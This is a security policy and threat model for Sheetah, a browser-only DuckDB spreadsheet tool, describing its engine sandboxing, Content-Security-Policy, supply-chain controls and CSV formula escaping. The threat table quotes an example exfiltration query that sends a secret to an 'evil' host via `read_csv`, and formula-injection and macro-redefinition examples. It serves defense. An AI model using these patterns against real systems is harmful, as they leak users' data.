# Security

Sheetah is a static site. Files are opened and queried inside the browser tab by DuckDB compiled to WebAssembly.
There is no backend, account system, analytics or error reporting: nothing about your use of Sheetah is sent anywhere.

## Threat model

| Asset | Where it lives |
|---|---|
| The user's files and query results | Tab memory only (gone on reload), unless the user turns on "Keep my tables" |
| Kept tables (opt-in) | Arrow files in this origin's private file system (OPFS), unencrypted |
| Query history, saved views, settings | `localStorage` on this device (history only if "Remember queries in this browser" is ticked; off by default) |
| Pseudonym key (Anonymize) | A random secret per session in the engine's memory; kept in `localStorage` only if the user asks for stable pseudonyms |
| The app's own code | Served from this origin; built from this repo on Vercel |

| Threat | Mitigation |
|---|---|
| **Data exfiltration through SQL.** A pasted or shared query like `read_csv('https://evil/?d=' \|\| secret)` makes the engine send data in a URL. | The engine is **sealed** before the app can use it (`src/engine/db.ts`): file access is limited to the virtual `/sheetah/` folder, `enable_external_access = false` turns off URLs and every other path, and `lock_configuration = true` stops SQL from turning any of it back on. Verified with 13 attack queries (URL and cloud-storage reads, data smuggled into a URL through a variable, `ATTACH`, `COPY TO` a URL, re-enabling settings, remote extensions, path traversal): all fail, and the browser makes zero outbound requests. |
| **Exfiltration through the page.** A bug or a compromised dependency calls `fetch`/XHR/beacons/images to another host. | `Content-Security-Policy` (see `vercel.json`): `connect-src 'self'`, `img-src 'self' data: blob:`, `default-src 'self'`, no inline scripts, no `eval` (only `wasm-unsafe-eval`), `form-action 'none'`, `frame-ancestors 'none'`. This is an independent second layer: `fetch`, XHR, images and `blob:` workers to other origins are all refused by the browser. |
| **Remote code at runtime.** Loading DuckDB extensions from a third-party host would run code with access to the user's data. | Extensions are served from this origin only and loaded **before** the engine is sealed; there is no fallback host. The build pins their SHA-256 hashes (`scripts/duckdb-extensions.lock.json`) and fails on mismatch. DuckDB also rejects unsigned or badly signed extensions (`allow_unsigned_extensions` stays off and is locked). |
| **Supply chain.** A malicious or compromised npm release. | Exact versions plus a lockfile, `npm ci --ignore-scripts` in CI, `npm audit --omit=dev` on every push, and Dependabot (engine upgrades are reviewed on their own). |
| **CSV formula injection.** A text cell like `=HYPERLINK(...)` runs when an export is opened in Excel or Sheets. | CSV export is "Excel-safe" by default: text cells starting with `= + - @` (or tab/CR) are prefixed with `'`. You can turn it off for raw output. |
| **Sensitive values at rest.** Queries such as `WHERE email = 'x@y.com'` would end up in the history. | History stays in the tab unless "Remember queries in this browser" is ticked (off by default), and "Clear all local data" wipes history, saved views and kept tables. Data is only persisted if you opt in to "Keep my tables"; with it on, the query on screen is kept too, so a reload comes back to it. |
| **SQL that redefines functions.** A shared or pasted script could define a macro named `sha256` (really `md5`) or `lower`, so that Anonymize's pseudonyms or masks quietly stop protecting anything while their SQL reads the same. | After any script that makes a macro, one named for a built-in function or for Sheetah's own (`pseudonym`, `number_from_text`…) is dropped, Sheetah's are put back, and the user is told. `pseudonym()` calls the built-ins by their catalog name (`system.main.sha256`). The pseudonym key itself is readable by SQL in the tab (`getvariable`), as any secret the page holds is to code the user runs: a pseudonym protects data you send on, not from the person running the queries. |
| **Formulas in exports.** A hostile file's cell or column name such as `=HYPERLINK(…)` could run when the export is opened in Excel. | "CSV" (safe for Excel) puts a quote in front of any value or column name that would start a formula, in every column that isn't a number, date or true/false; Excel exports write text as text, never formulas; cells copied from the grid are pasted the same way. "CSV, exact values" is for code and databases and writes values as they are. |
| **Malicious shared links.** Someone sends a link with a harmful query. | The SQL lives in the URL fragment, which browsers never send to the server, and is stripped from the address bar on open. It is never run automatically: Sheetah shows it for review first. Even if run, the sealed engine and CSP stop it from sending anything anywhere. Decoding rejects invalid data and stops as soon as the decompressed SQL passes 100 KB, so a tiny link that would inflate to gigabytes (a "zip bomb") can't exhaust memory. |
| **Malicious views files.** Someone sends a views file (Saved › Import views) with a harmful query, or one crafted to break the app. | Importing only adds views, and each imported view is **shown for review before it first runs**: clicking it (or "Review it" on the fits offer) puts its SQL in the editor, and only Run runs it, like a shared link. The file is parsed field by field with a 1 MB cap (checked before reading) and at most 500 views: names lose control characters, a view's tables are the ones its SQL actually reads, its date can't be in the future (so it can't put itself first), and column shapes are rebuilt with no prototype and read by own key only, so names like `__proto__` or `constructor` can't reach inherited properties. A view's steps (the header actions it was made of, restored as chips) are used only while composing them gives exactly the view's SQL, comments aside; otherwise they're dropped and the reviewed SQL runs as written, so steps can never run something the SQL doesn't show. A view's SQL runs on the same sealed engine as anything typed. |
| **Personal data in shared exports.** People share files that contain emails, phone numbers or national IDs. | "Anonymize" finds them (patterns plus Verhoeff/Luhn checksums on a sample) and masks, generalizes or removes them in SQL the user can read. Pseudonyms are a keyed SHA-256: the key is random per session (or kept locally on request) and is never written into SQL, share links or exports, so pseudonyms can't be reversed by hashing guesses. Detection is a helper, not a guarantee: the dialog says to check free-text columns. |
| **Data at rest from "Keep my tables".** | Off by default; the toggle says the data is stored on this device unencrypted. Turning it off, or "Clear all local data", deletes the folder. OPFS is per-origin, so other sites can't read it. Sample data is never kept. |
| **Stale or tampered offline cache.** | The service worker only caches same-origin files from a build-time manifest and is served `no-cache`. Each build stamps its content hash into the worker, so browsers install every deploy; the new version waits until the user clicks Reload (no files vanish under an open tab), then old caches are deleted. Pages are fetched network-first, so a fresh deploy wins whenever the network is up. |
| **Clickjacking / framing.** | `frame-ancestors 'none'` and `X-Frame-Options: DENY`. |
| **Cross-origin leaks.** | `Cross-Origin-Opener-Policy: same-origin`, `Cross-Origin-Resource-Policy: same-origin`, `Referrer-Policy: no-referrer`, `X-Content-Type-Options: nosniff`, and a `Permissions-Policy` that disables camera, microphone, location, USB, serial, HID, payment, MIDI and Topics. The social-preview image and icons are served with `Cross-Origin-Resource-Policy: cross-origin` so link previews can show them. |

### Out of scope / known limits

- A malicious browser extension or a compromised device can read anything on the page. A web app can't defend against that.
- Very large or malicious archives (`.gz`, `.xlsx` zip bombs) can exhaust the tab's memory. That's a crash, not a leak, and it only affects the tab that opened the file.
- `style-src 'unsafe-inline'` is allowed because the SQL editor and React set inline styles. No inline *scripts* are allowed.
- `worker-src` allows `blob:` because the Excel parser starts helper workers that way. Those workers inherit the same CSP.

## Verifying

- **Headers:** `curl -sI https://sheetah.vercel.app/ | grep -i content-security-policy`
- **No network:** open DevTools → Network, open a file and run queries. Only same-origin static assets load.
- **Sandbox:** run `SELECT * FROM read_csv('https://example.org/x.csv')` in Sheetah. You should get *"file system operations are disabled by configuration"*.

## Reporting a vulnerability

Please open a private security advisory on the GitHub repository (Security → Report a vulnerability) instead of a public issue.
